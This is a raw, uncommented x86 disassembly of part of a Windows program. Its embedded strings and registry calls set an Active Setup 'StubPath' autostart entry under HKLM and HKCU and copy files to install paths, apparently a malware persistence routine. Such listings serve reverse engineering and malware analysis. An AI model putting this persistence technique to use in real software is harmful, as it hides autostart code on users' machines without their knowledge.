  4068e3:	6a 00                	push   $0x0
  4068e5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4068e8:	8b d6                	mov    %esi,%edx
  4068ea:	e8 bd b3 ff ff       	call   0x401cac
  4068ef:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4068f2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4068f5:	ba a0 69 40 00       	mov    $0x4069a0,%edx
  4068fa:	e8 9d b4 ff ff       	call   0x401d9c
  4068ff:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406902:	e8 41 b6 ff ff       	call   0x401f48
  406907:	50                   	push   %eax
  406908:	68 02 00 00 80       	push   $0x80000002
  40690d:	e8 f6 cb ff ff       	call   0x403508
  406912:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406915:	8b d3                	mov    %ebx,%edx
  406917:	e8 90 b3 ff ff       	call   0x401cac
  40691c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40691f:	e8 2c b4 ff ff       	call   0x401d50
  406924:	8b f0                	mov    %eax,%esi
  406926:	a1 90 d0 40 00       	mov    0x40d090,%eax
  40692b:	e8 20 b4 ff ff       	call   0x401d50
  406930:	03 f0                	add    %eax,%esi
  406932:	56                   	push   %esi
  406933:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406936:	8b d3                	mov    %ebx,%edx
  406938:	e8 6f b3 ff ff       	call   0x401cac
  40693d:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406940:	8b 15 90 d0 40 00    	mov    0x40d090,%edx
  406946:	e8 0d b4 ff ff       	call   0x401d58
  40694b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40694e:	e8 f5 b5 ff ff       	call   0x401f48
  406953:	50                   	push   %eax
  406954:	6a 01                	push   $0x1
  406956:	6a 00                	push   $0x0
  406958:	68 d8 69 40 00       	push   $0x4069d8
  40695d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406960:	50                   	push   %eax
  406961:	e8 ca cb ff ff       	call   0x403530
  406966:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406969:	50                   	push   %eax
  40696a:	e8 89 cb ff ff       	call   0x4034f8
  40696f:	33 c0                	xor    %eax,%eax
  406971:	5a                   	pop    %edx
  406972:	59                   	pop    %ecx
  406973:	59                   	pop    %ecx
  406974:	64 89 10             	mov    %edx,%fs:(%eax)
  406977:	68 91 69 40 00       	push   $0x406991
  40697c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40697f:	ba 04 00 00 00       	mov    $0x4,%edx
  406984:	e8 5b b1 ff ff       	call   0x401ae4
  406989:	c3                   	ret
  40698a:	e9 7d ae ff ff       	jmp    0x40180c
  40698f:	eb eb                	jmp    0x40697c
  406991:	5e                   	pop    %esi
  406992:	5b                   	pop    %ebx
  406993:	8b e5                	mov    %ebp,%esp
  406995:	5d                   	pop    %ebp
  406996:	c3                   	ret
  406997:	00 ff                	add    %bh,%bh
  406999:	ff                   	(bad)
  40699a:	ff                   	(bad)
  40699b:	ff 35 00 00 00 53    	push   0x53000000
  4069a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4069a2:	66 74 77             	data16 je 0x406a1c
  4069a5:	61                   	popa
  4069a6:	72 65                	jb     0x406a0d
  4069a8:	5c                   	pop    %esp
  4069a9:	4d                   	dec    %ebp
  4069aa:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4069b1:	74 5c                	je     0x406a0f
  4069b3:	41                   	inc    %ecx
  4069b4:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  4069b8:	65 20 53 65          	and    %dl,%gs:0x65(%ebx)
  4069bc:	74 75                	je     0x406a33
  4069be:	70 5c                	jo     0x406a1c
  4069c0:	49                   	dec    %ecx
  4069c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4069c2:	73 74                	jae    0x406a38
  4069c4:	61                   	popa
  4069c5:	6c                   	insb   (%dx),%es:(%edi)
  4069c6:	6c                   	insb   (%dx),%es:(%edi)
  4069c7:	65 64 20 43 6f       	gs and %al,%fs:0x6f(%ebx)
  4069cc:	6d                   	insl   (%dx),%es:(%edi)
  4069cd:	70 6f                	jo     0x406a3e
  4069cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4069d0:	65 6e                	outsb  %gs:(%esi),(%dx)
  4069d2:	74 73                	je     0x406a47
  4069d4:	5c                   	pop    %esp
  4069d5:	00 00                	add    %al,(%eax)
  4069d7:	00 53 74             	add    %dl,0x74(%ebx)
  4069da:	75 62                	jne    0x406a3e
  4069dc:	50                   	push   %eax
  4069dd:	61                   	popa
  4069de:	74 68                	je     0x406a48
  4069e0:	00 00                	add    %al,(%eax)
  4069e2:	00 00                	add    %al,(%eax)
  4069e4:	53                   	push   %ebx
  4069e5:	51                   	push   %ecx
  4069e6:	8b da                	mov    %edx,%ebx
  4069e8:	54                   	push   %esp
  4069e9:	68 06 00 02 00       	push   $0x20006
  4069ee:	6a 00                	push   $0x0
  4069f0:	68 18 6a 40 00       	push   $0x406a18
  4069f5:	68 01 00 00 80       	push   $0x80000001
  4069fa:	e8 21 cb ff ff       	call   0x403520
  4069ff:	53                   	push   %ebx
  406a00:	8b 44 24 04          	mov    0x4(%esp),%eax
  406a04:	50                   	push   %eax
  406a05:	e8 06 cb ff ff       	call   0x403510
  406a0a:	8b 04 24             	mov    (%esp),%eax
  406a0d:	50                   	push   %eax
  406a0e:	e8 e5 ca ff ff       	call   0x4034f8
  406a13:	5a                   	pop    %edx
  406a14:	5b                   	pop    %ebx
  406a15:	c3                   	ret
  406a16:	00 00                	add    %al,(%eax)
  406a18:	53                   	push   %ebx
  406a19:	6f                   	outsl  %ds:(%esi),(%dx)
  406a1a:	66 74 77             	data16 je 0x406a94
  406a1d:	61                   	popa
  406a1e:	72 65                	jb     0x406a85
  406a20:	5c                   	pop    %esp
  406a21:	4d                   	dec    %ebp
  406a22:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  406a29:	74 5c                	je     0x406a87
  406a2b:	41                   	inc    %ecx
  406a2c:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  406a30:	65 20 53 65          	and    %dl,%gs:0x65(%ebx)
  406a34:	74 75                	je     0x406aab
  406a36:	70 5c                	jo     0x406a94
  406a38:	49                   	dec    %ecx
  406a39:	6e                   	outsb  %ds:(%esi),(%dx)
  406a3a:	73 74                	jae    0x406ab0
  406a3c:	61                   	popa
  406a3d:	6c                   	insb   (%dx),%es:(%edi)
  406a3e:	6c                   	insb   (%dx),%es:(%edi)
  406a3f:	65 64 20 43 6f       	gs and %al,%fs:0x6f(%ebx)
  406a44:	6d                   	insl   (%dx),%es:(%edi)
  406a45:	70 6f                	jo     0x406ab6
  406a47:	6e                   	outsb  %ds:(%esi),(%dx)
  406a48:	65 6e                	outsb  %gs:(%esi),(%dx)
  406a4a:	74 73                	je     0x406abf
  406a4c:	5c                   	pop    %esp
  406a4d:	00 00                	add    %al,(%eax)
  406a4f:	00 55 8b             	add    %dl,-0x75(%ebp)
  406a52:	ec                   	in     (%dx),%al
  406a53:	6a 00                	push   $0x0
  406a55:	53                   	push   %ebx
  406a56:	56                   	push   %esi
  406a57:	57                   	push   %edi
  406a58:	8b f9                	mov    %ecx,%edi
  406a5a:	8b f2                	mov    %edx,%esi
  406a5c:	8b d8                	mov    %eax,%ebx
  406a5e:	33 c0                	xor    %eax,%eax
  406a60:	55                   	push   %ebp
  406a61:	68 be 6a 40 00       	push   $0x406abe
  406a66:	64 ff 30             	push   %fs:(%eax)
  406a69:	64 89 20             	mov    %esp,%fs:(%eax)
  406a6c:	8d 55 fc             	lea    -0x4(%ebp),%edx
  406a6f:	b8 01 00 00 00       	mov    $0x1,%eax
  406a74:	e8 2b a9 ff ff       	call   0x4013a4
  406a79:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a7c:	ba d4 6a 40 00       	mov    $0x406ad4,%edx
  406a81:	e8 0e b4 ff ff       	call   0x401e94
  406a86:	75 20                	jne    0x406aa8
  406a88:	57                   	push   %edi
  406a89:	6a 00                	push   $0x0
  406a8b:	6a 05                	push   $0x5
  406a8d:	8b ce                	mov    %esi,%ecx
  406a8f:	33 d2                	xor    %edx,%edx
  406a91:	33 c0                	xor    %eax,%eax
  406a93:	e8 40 f0 ff ff       	call   0x405ad8
  406a98:	b2 01                	mov    $0x1,%dl
  406a9a:	8b c3                	mov    %ebx,%eax
  406a9c:	e8 d7 fd ff ff       	call   0x406878
  406aa1:	6a 00                	push   $0x0
  406aa3:	e8 f8 ca ff ff       	call   0x4035a0
  406aa8:	33 c0                	xor    %eax,%eax
  406aaa:	5a                   	pop    %edx
  406aab:	59                   	pop    %ecx
  406aac:	59                   	pop    %ecx
  406aad:	64 89 10             	mov    %edx,%fs:(%eax)
  406ab0:	68 c5 6a 40 00       	push   $0x406ac5
  406ab5:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406ab8:	e8 03 b0 ff ff       	call   0x401ac0
  406abd:	c3                   	ret
  406abe:	e9 49 ad ff ff       	jmp    0x40180c
  406ac3:	eb f0                	jmp    0x406ab5
  406ac5:	5f                   	pop    %edi
  406ac6:	5e                   	pop    %esi
  406ac7:	5b                   	pop    %ebx
  406ac8:	59                   	pop    %ecx
  406ac9:	5d                   	pop    %ebp
  406aca:	c3                   	ret
  406acb:	00 ff                	add    %bh,%bh
  406acd:	ff                   	(bad)
  406ace:	ff                   	(bad)
  406acf:	ff 07                	incl   (%edi)
  406ad1:	00 00                	add    %al,(%eax)
  406ad3:	00 52 65             	add    %dl,0x65(%edx)
  406ad6:	73 74                	jae    0x406b4c
  406ad8:	61                   	popa
  406ad9:	72 74                	jb     0x406b4f
  406adb:	00 55 8b             	add    %dl,-0x75(%ebp)
  406ade:	ec                   	in     (%dx),%al
  406adf:	53                   	push   %ebx
  406ae0:	56                   	push   %esi
  406ae1:	57                   	push   %edi
  406ae2:	8b f9                	mov    %ecx,%edi
  406ae4:	8b f2                	mov    %edx,%esi
  406ae6:	8b d8                	mov    %eax,%ebx
  406ae8:	8b d6                	mov    %esi,%edx
  406aea:	8b c3                	mov    %ebx,%eax
  406aec:	e8 f3 fe ff ff       	call   0x4069e4
  406af1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406af4:	8b d7                	mov    %edi,%edx
  406af6:	8b c3                	mov    %ebx,%eax
  406af8:	e8 53 ff ff ff       	call   0x406a50
  406afd:	8b cf                	mov    %edi,%ecx
  406aff:	8b d6                	mov    %esi,%edx
  406b01:	8b c3                	mov    %ebx,%eax
  406b03:	e8 ac fd ff ff       	call   0x4068b4
  406b08:	5f                   	pop    %edi
  406b09:	5e                   	pop    %esi
  406b0a:	5b                   	pop    %ebx
  406b0b:	5d                   	pop    %ebp
  406b0c:	c2 04 00             	ret    $0x4
  406b0f:	90                   	nop
  406b10:	55                   	push   %ebp
  406b11:	8b ec                	mov    %esp,%ebp
  406b13:	33 c0                	xor    %eax,%eax
  406b15:	55                   	push   %ebp
  406b16:	68 41 6b 40 00       	push   $0x406b41
  406b1b:	64 ff 30             	push   %fs:(%eax)
  406b1e:	64 89 20             	mov    %esp,%fs:(%eax)
  406b21:	ff 05 90 e9 40 00    	incl   0x40e990
  406b27:	75 0a                	jne    0x406b33
  406b29:	b8 90 d0 40 00       	mov    $0x40d090,%eax
  406b2e:	e8 8d af ff ff       	call   0x401ac0
  406b33:	33 c0                	xor    %eax,%eax
  406b35:	5a                   	pop    %edx
  406b36:	59                   	pop    %ecx
  406b37:	59                   	pop    %ecx
  406b38:	64 89 10             	mov    %edx,%fs:(%eax)
  406b3b:	68 48 6b 40 00       	push   $0x406b48
  406b40:	c3                   	ret
  406b41:	e9 c6 ac ff ff       	jmp    0x40180c
  406b46:	eb f8                	jmp    0x406b40
  406b48:	5d                   	pop    %ebp
  406b49:	c3                   	ret
  406b4a:	8b c0                	mov    %eax,%eax
  406b4c:	83 2d 90 e9 40 00 01 	subl   $0x1,0x40e990
  406b53:	c3                   	ret
  406b54:	55                   	push   %ebp
  406b55:	8b ec                	mov    %esp,%ebp
  406b57:	b9 0f 00 00 00       	mov    $0xf,%ecx
  406b5c:	6a 00                	push   $0x0
  406b5e:	6a 00                	push   $0x0
  406b60:	49                   	dec    %ecx
  406b61:	75 f9                	jne    0x406b5c
  406b63:	51                   	push   %ecx
  406b64:	53                   	push   %ebx
  406b65:	56                   	push   %esi
  406b66:	57                   	push   %edi
  406b67:	8b da                	mov    %edx,%ebx
  406b69:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406b6c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b6f:	e8 c4 b3 ff ff       	call   0x401f38
  406b74:	33 c0                	xor    %eax,%eax
  406b76:	55                   	push   %ebp
  406b77:	68 61 70 40 00       	push   $0x407061
  406b7c:	64 ff 30             	push   %fs:(%eax)
  406b7f:	64 89 20             	mov    %esp,%fs:(%eax)
  406b82:	8b c3                	mov    %ebx,%eax
  406b84:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406b87:	e8 88 af ff ff       	call   0x401b14
  406b8c:	a1 f0 d1 40 00       	mov    0x40d1f0,%eax
  406b91:	83 38 00             	cmpl   $0x0,(%eax)
  406b94:	75 0d                	jne    0x406ba3
  406b96:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406b99:	e8 52 f3 ff ff       	call   0x405ef0
  406b9e:	e9 98 00 00 00       	jmp    0x406c3b
  406ba3:	a1 f0 d1 40 00       	mov    0x40d1f0,%eax
  406ba8:	83 38 01             	cmpl   $0x1,(%eax)
  406bab:	75 0d                	jne    0x406bba
  406bad:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406bb0:	e8 c7 f3 ff ff       	call   0x405f7c
  406bb5:	e9 81 00 00 00       	jmp    0x406c3b
  406bba:	a1 f0 d1 40 00       	mov    0x40d1f0,%eax
  406bbf:	83 38 02             	cmpl   $0x2,(%eax)
  406bc2:	75 0a                	jne    0x406bce
  406bc4:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406bc7:	e8 68 f4 ff ff       	call   0x406034
  406bcc:	eb 6d                	jmp    0x406c3b
  406bce:	a1 f0 d1 40 00       	mov    0x40d1f0,%eax
  406bd3:	83 38 03             	cmpl   $0x3,(%eax)
  406bd6:	75 0a                	jne    0x406be2
  406bd8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406bdb:	e8 fc f5 ff ff       	call   0x4061dc
  406be0:	eb 59                	jmp    0x406c3b
  406be2:	a1 18 d2 40 00       	mov    0x40d218,%eax
  406be7:	8b 00                	mov    (%eax),%eax
  406be9:	e8 62 b1 ff ff       	call   0x401d50
  406bee:	8b 15 18 d2 40 00    	mov    0x40d218,%edx
  406bf4:	8b 12                	mov    (%edx),%edx
  406bf6:	80 7c 02 ff 5c       	cmpb   $0x5c,-0x1(%edx,%eax,1)
  406bfb:	74 14                	je     0x406c11
  406bfd:	a1 18 d2 40 00       	mov    0x40d218,%eax
  406c02:	ba 78 70 40 00       	mov    $0x407078,%edx
  406c07:	e8 4c b1 ff ff       	call   0x401d58
  406c0c:	a1 18 d2 40 00       	mov    0x40d218,%eax
  406c11:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406c14:	8b 15 18 d2 40 00    	mov    0x40d218,%edx
  406c1a:	8b 12                	mov    (%edx),%edx
  406c1c:	e8 37 af ff ff       	call   0x401b58
  406c21:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406c24:	e8 1f b3 ff ff       	call   0x401f48
  406c29:	8b d0                	mov    %eax,%edx
  406c2b:	8d 45 e8             	lea    -0x18(%ebp),%eax
  406c2e:	e8 79 b0 ff ff       	call   0x401cac
  406c33:	8b 45 e8             	mov    -0x18(%ebp),%eax
  406c36:	e8 49 fa ff ff       	call   0x406684
  406c3b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406c3e:	e8 0d b1 ff ff       	call   0x401d50
  406c43:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406c46:	80 7c 02 ff 5c       	cmpb   $0x5c,-0x1(%edx,%eax,1)
  406c4b:	74 0d                	je     0x406c5a
  406c4d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406c50:	ba 78 70 40 00       	mov    $0x407078,%edx
  406c55:	e8 fe b0 ff ff       	call   0x401d58
  406c5a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406c5d:	8b 15 08 d2 40 00    	mov    0x40d208,%edx
  406c63:	8b 12                	mov    (%edx),%edx
  406c65:	e8 ee b0 ff ff       	call   0x401d58
  406c6a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406c6d:	e8 de b0 ff ff       	call   0x401d50
  406c72:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406c75:	80 7c 02 ff 5c       	cmpb   $0x5c,-0x1(%edx,%eax,1)
  406c7a:	74 0d                	je     0x406c89
  406c7c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406c7f:	ba 78 70 40 00       	mov    $0x407078,%edx
  406c84:	e8 cf b0 ff ff       	call   0x401d58
  406c89:	8b 0d 0c d2 40 00    	mov    0x40d20c,%ecx
  406c8f:	8b 09                	mov    (%ecx),%ecx
  406c91:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406c94:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406c97:	e8 00 b1 ff ff       	call   0x401d9c
  406c9c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406c9f:	e8 a4 b2 ff ff       	call   0x401f48
  406ca4:	8b d0                	mov    %eax,%edx
  406ca6:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406ca9:	e8 fe af ff ff       	call   0x401cac
  406cae:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406cb1:	e8 ce f9 ff ff       	call   0x406684
  406cb6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406cb9:	e8 8a b2 ff ff       	call   0x401f48
  406cbe:	8b d0                	mov    %eax,%edx
  406cc0:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406cc3:	e8 e4 af ff ff       	call   0x401cac
  406cc8:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406ccb:	e8 58 ed ff ff       	call   0x405a28
  406cd0:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406cd3:	e8 14 ef ff ff       	call   0x405bec
  406cd8:	ff 75 dc             	push   -0x24(%ebp)
  406cdb:	68 78 70 40 00       	push   $0x407078
  406ce0:	a1 08 d2 40 00       	mov    0x40d208,%eax
  406ce5:	ff 30                	push   (%eax)
  406ce7:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406cea:	ba 03 00 00 00       	mov    $0x3,%edx
  406cef:	e8 1c b1 ff ff       	call   0x401e10
  406cf4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406cf7:	e8 54 b0 ff ff       	call   0x401d50
  406cfc:	8b 55 f0             	mov    -0x10(%ebp),%edx
  406cff:	80 7c 02 ff 5c       	cmpb   $0x5c,-0x1(%edx,%eax,1)
  406d04:	74 0d                	je     0x406d13
  406d06:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406d09:	ba 78 70 40 00       	mov    $0x407078,%edx
  406d0e:	e8 45 b0 ff ff       	call   0x401d58
  406d13:	8b 0d 0c d2 40 00    	mov    0x40d20c,%ecx
  406d19:	8b 09                	mov    (%ecx),%ecx
  406d1b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406d1e:	8b 55 f0             	mov    -0x10(%ebp),%edx
  406d21:	e8 76 b0 ff ff       	call   0x401d9c
  406d26:	8d 55 d8             	lea    -0x28(%ebp),%edx
  406d29:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406d2c:	e8 0f da ff ff       	call   0x404740
  406d31:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406d34:	50                   	push   %eax
  406d35:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406d38:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406d3b:	e8 00 da ff ff       	call   0x404740
  406d40:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  406d43:	58                   	pop    %eax
  406d44:	e8 4b b1 ff ff       	call   0x401e94
  406d49:	74 25                	je     0x406d70
  406d4b:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406d4e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406d51:	e8 ea d9 ff ff       	call   0x404740
  406d56:	8b 45 d0             	mov    -0x30(%ebp),%eax
  406d59:	50                   	push   %eax
  406d5a:	8d 55 cc             	lea    -0x34(%ebp),%edx
  406d5d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406d60:	e8 db d9 ff ff       	call   0x404740
  406d65:	8b 55 cc             	mov    -0x34(%ebp),%edx
  406d68:	58                   	pop    %eax
  406d69:	e8 26 b1 ff ff       	call   0x401e94
  406d6e:	75 0f                	jne    0x406d7f
  406d70:	8b c3                	mov    %ebx,%eax
  406d72:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406d75:	e8 9a ad ff ff       	call   0x401b14
  406d7a:	e9 c7 02 00 00       	jmp    0x407046
  406d7f:	6a 00                	push   $0x0
  406d81:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406d84:	e8 bf b1 ff ff       	call   0x401f48
  406d89:	50                   	push   %eax
  406d8a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406d8d:	e8 b6 b1 ff ff       	call   0x401f48
  406d92:	8b f0                	mov    %eax,%esi
  406d94:	56                   	push   %esi
  406d95:	e8 a6 c7 ff ff       	call   0x403540
  406d9a:	83 f8 01             	cmp    $0x1,%eax
  406d9d:	1b c0                	sbb    %eax,%eax
  406d9f:	40                   	inc    %eax
  406da0:	3c 01                	cmp    $0x1,%al
  406da2:	75 0c                	jne    0x406db0
  406da4:	8b c3                	mov    %ebx,%eax
  406da6:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406da9:	e8 66 ad ff ff       	call   0x401b14
  406dae:	eb 5f                	jmp    0x406e0f
  406db0:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406db3:	e8 90 b1 ff ff       	call   0x401f48
  406db8:	8b d0                	mov    %eax,%edx
  406dba:	8d 45 c8             	lea    -0x38(%ebp),%eax
  406dbd:	e8 ea ae ff ff       	call   0x401cac
  406dc2:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406dc5:	e8 ba f8 ff ff       	call   0x406684
  406dca:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406dcd:	e8 76 b1 ff ff       	call   0x401f48
  406dd2:	8b f8                	mov    %eax,%edi
  406dd4:	8b d7                	mov    %edi,%edx
  406dd6:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  406dd9:	e8 ce ae ff ff       	call   0x401cac
  406dde:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  406de1:	e8 42 ec ff ff       	call   0x405a28
  406de6:	6a 00                	push   $0x0
  406de8:	57                   	push   %edi
  406de9:	56                   	push   %esi
  406dea:	e8 51 c7 ff ff       	call   0x403540
  406def:	83 f8 01             	cmp    $0x1,%eax
  406df2:	1b c0                	sbb    %eax,%eax
  406df4:	40                   	inc    %eax
  406df5:	3c 01                	cmp    $0x1,%al
  406df7:	75 0c                	jne    0x406e05
  406df9:	8b c3                	mov    %ebx,%eax
  406dfb:	8b 55 ec             	mov    -0x14(%ebp),%edx
  406dfe:	e8 11 ad ff ff       	call   0x401b14
  406e03:	eb 0a                	jmp    0x406e0f
  406e05:	8b c3                	mov    %ebx,%eax
  406e07:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406e0a:	e8 05 ad ff ff       	call   0x401b14
  406e0f:	a1 ec d1 40 00       	mov    0x40d1ec,%eax
  406e14:	83 38 00             	cmpl   $0x0,(%eax)
  406e17:	0f 84 ee 00 00 00    	je     0x406f0b
  406e1d:	6a 00                	push   $0x0
  406e1f:	8d 45 c0             	lea    -0x40(%ebp),%eax
  406e22:	50                   	push   %eax
  406e23:	a1 ec d1 40 00       	mov    0x40d1ec,%eax
  406e28:	8b 00                	mov    (%eax),%eax
  406e2a:	e8 19 b1 ff ff       	call   0x401f48
  406e2f:	8b d0                	mov    %eax,%edx
  406e31:	8d 45 bc             	lea    -0x44(%ebp),%eax
  406e34:	e8 73 ae ff ff       	call   0x401cac
  406e39:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  406e3c:	ba 84 70 40 00       	mov    $0x407084,%edx
  406e41:	b8 02 00 00 80       	mov    $0x80000002,%eax
  406e46:	e8 3d f2 ff ff       	call   0x406088
  406e4b:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406e4e:	8b 13                	mov    (%ebx),%edx
  406e50:	e8 3f b0 ff ff       	call   0x401e94
  406e55:	74 3d                	je     0x406e94
  406e57:	8b 03                	mov    (%ebx),%eax
  406e59:	e8 ea b0 ff ff       	call   0x401f48
  406e5e:	8b d0                	mov    %eax,%edx
  406e60:	8d 45 b8             	lea    -0x48(%ebp),%eax
  406e63:	e8 44 ae ff ff       	call   0x401cac
  406e68:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406e6b:	50                   	push   %eax
  406e6c:	a1 ec d1 40 00       	mov    0x40d1ec,%eax
  406e71:	8b 00                	mov    (%eax),%eax
  406e73:	e8 d0 b0 ff ff       	call   0x401f48
  406e78:	8b d0                	mov    %eax,%edx
  406e7a:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  406e7d:	e8 2a ae ff ff       	call   0x401cac
  406e82:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  406e85:	ba 84 70 40 00       	mov    $0x407084,%edx
  406e8a:	b8 02 00 00 80       	mov    $0x80000002,%eax
  406e8f:	e8 b8 ed ff ff       	call   0x405c4c
  406e94:	6a 00                	push   $0x0
  406e96:	8d 45 b0             	lea    -0x50(%ebp),%eax
  406e99:	50                   	push   %eax
  406e9a:	a1 ec d1 40 00       	mov    0x40d1ec,%eax
  406e9f:	8b 00                	mov    (%eax),%eax
  406ea1:	e8 a2 b0 ff ff       	call   0x401f48
  406ea6:	8b d0                	mov    %eax,%edx
  406ea8:	8d 45 ac             	lea    -0x54(%ebp),%eax
  406eab:	e8 fc ad ff ff       	call   0x401cac
  406eb0:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  406eb3:	ba 84 70 40 00       	mov    $0x407084,%edx
  406eb8:	b8 01 00 00 80       	mov    $0x80000001,%eax
  406ebd:	e8 c6 f1 ff ff       	call   0x406088
  406ec2:	8b 45 b0             	mov    -0x50(%ebp),%eax
  406ec5:	8b 13                	mov    (%ebx),%edx
  406ec7:	e8 c8 af ff ff       	call   0x401e94
  406ecc:	74 3d                	je     0x406f0b
  406ece:	8b 03                	mov    (%ebx),%eax
  406ed0:	e8 73 b0 ff ff       	call   0x401f48
  406ed5:	8b d0                	mov    %eax,%edx
  406ed7:	8d 45 a8             	lea    -0x58(%ebp),%eax
  406eda:	e8 cd ad ff ff       	call   0x401cac
  406edf:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406ee2:	50                   	push   %eax
  406ee3:	a1 ec d1 40 00       	mov    0x40d1ec,%eax
  406ee8:	8b 00                	mov    (%eax),%eax
  406eea:	e8 59 b0 ff ff       	call   0x401f48
  406eef:	8b d0                	mov    %eax,%edx
  406ef1:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  406ef4:	e8 b3 ad ff ff       	call   0x401cac
  406ef9:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
  406efc:	ba 84 70 40 00       	mov    $0x407084,%edx
  406f01:	b8 01 00 00 80       	mov    $0x80000001,%eax
  406f06:	e8 41 ed ff ff       	call   0x405c4c
  406f0b:	a1 d8 d1 40 00       	mov    0x40d1d8,%eax
  406f10:	83 38 00             	cmpl   $0x0,(%eax)
  406f13:	74 77                	je     0x406f8c
  406f15:	6a 00                	push   $0x0
  406f17:	8d 45 a0             	lea    -0x60(%ebp),%eax
  406f1a:	50                   	push   %eax
  406f1b:	a1 d8 d1 40 00       	mov    0x40d1d8,%eax
  406f20:	8b 00                	mov    (%eax),%eax
  406f22:	e8 21 b0 ff ff       	call   0x401f48
  406f27:	8b d0                	mov    %eax,%edx
  406f29:	8d 45 9c             	lea    -0x64(%ebp),%eax
  406f2c:	e8 7b ad ff ff       	call   0x401cac
  406f31:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  406f34:	ba cc 70 40 00       	mov    $0x4070cc,%edx
  406f39:	b8 02 00 00 80       	mov    $0x80000002,%eax
  406f3e:	e8 45 f1 ff ff       	call   0x406088
  406f43:	8b 45 a0             	mov    -0x60(%ebp),%eax
  406f46:	8b 13                	mov    (%ebx),%edx
  406f48:	e8 47 af ff ff       	call   0x401e94
  406f4d:	74 3d                	je     0x406f8c
  406f4f:	8b 03                	mov    (%ebx),%eax
  406f51:	e8 f2 af ff ff       	call   0x401f48
  406f56:	8b d0                	mov    %eax,%edx
  406f58:	8d 45 98             	lea    -0x68(%ebp),%eax
  406f5b:	e8 4c ad ff ff       	call   0x401cac
  406f60:	8b 45 98             	mov    -0x68(%ebp),%eax
  406f63:	50                   	push   %eax
  406f64:	a1 d8 d1 40 00       	mov    0x40d1d8,%eax
  406f69:	8b 00                	mov    (%eax),%eax
  406f6b:	e8 d8 af ff ff       	call   0x401f48
  406f70:	8b d0                	mov    %eax,%edx
  406f72:	8d 45 94             	lea    -0x6c(%ebp),%eax
  406f75:	e8 32 ad ff ff       	call   0x401cac
  406f7a:	8b 4d 94             	mov    -0x6c(%ebp),%ecx
  406f7d:	ba cc 70 40 00       	mov    $0x4070cc,%edx
  406f82:	b8 02 00 00 80       	mov    $0x80000002,%eax
  406f87:	e8 c0 ec ff ff       	call   0x405c4c
  406f8c:	a1 e0 d1 40 00       	mov    0x40d1e0,%eax
  406f91:	83 38 00             	cmpl   $0x0,(%eax)
